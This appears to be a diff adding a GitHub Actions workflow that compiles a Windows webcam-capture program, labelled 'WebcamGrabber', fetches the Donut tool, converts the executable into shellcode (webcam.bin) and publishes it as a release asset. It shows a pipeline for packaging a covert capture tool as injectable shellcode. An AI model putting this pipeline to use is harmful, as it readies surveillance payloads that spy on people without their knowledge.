@@ -1,0 +1,78 @@
+name: Build Webcam
+
+on:
+  push:
+    branches: [ main ]
+    paths: 
+      - 'frontend-src/webcam-src/**'
+jobs:
+  build:
+
+    strategy:
+      matrix:
+        configuration: [Release]
+
+    runs-on: windows-latest
+    permissions:
+      contents: write
+      pull-requests: write
+      repository-projects: write
+    steps:
+    - name: Configure MSVC and Build
+      uses: actions/checkout@v3
+    - if: runner.os == 'Windows'
+      working-directory: ./frontend-src/webcam-src
+      shell: cmd
+      run: |
+          call "C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Auxiliary\\Build\\vcvars64.bat" 
+          cl webcam.cpp /O2 /DNDEBUG /MD /link strmiids.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /MACHINE:X64
+    - name: List directory for debugging
+      shell: cmd
+      run: |
+        cd frontend-src\webcam-src
+        dir
+        
+     # Delete-tag-and-release new
+    - name: Delete-tag-and-release
+      uses: dev-drprasad/delete-tag-and-release@v1.1
+      with:
+        tag_name: WebcamBuild #(required) - The name of the tag to delete. This is expected to be solely the tag name, not the name of a git reference.
+        delete_release: true #(optional) default: true - also delete all releases and their assets that are associated to the tag name
+        github_token: ${{ secrets.GITHUB_TOKEN }} # (required) - a GitHub token with write access to the repo where tags and releases will be searched and deleted
+        
+   # Create Release
+    - name: Create Release
+      id: create_release
+      uses: actions/create-release@latest
+      env:
+        GITHUB_TOKEN: ${{ secrets.github_token }}
+      with:
+        tag_name: WebcamBuild
+        release_name: WebcamBuild
+        body: "Release created by GitHub Actions"
+        draft: false
+        prerelease: false
+        
+        # Download Donut
+    - name: Download Donut
+      run: Invoke-WebRequest https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0.zip -OutFile donut.zip
+    
+    # Extract Donut
+    - name: Extract donut
+      run: Expand-Archive donut.zip
+
+    # Convert WebcamGrabber To Shellcode 
+    - name: Convert webcam-src to Shellcode 
+      run: .\donut\donut.exe -i frontend-src\webcam-src\webcam.exe -a2 -x2 -p "/filename webcam.png /delay 1" -z 4 -o webcam.bin
+
+    # Upload Shellcode Asset
+    - name: Upload Release Asset
+      id: upload-release-asset-donut
+      uses: actions/upload-release-asset@v1
+      env:
+        GITHUB_TOKEN: ${{ secrets.github_token }}
+      with:
+        upload_url: ${{ steps.create_release.outputs.upload_url }}
+        asset_path: webcam.bin
+        asset_name: webcam.bin
+        asset_content_type: application/zip
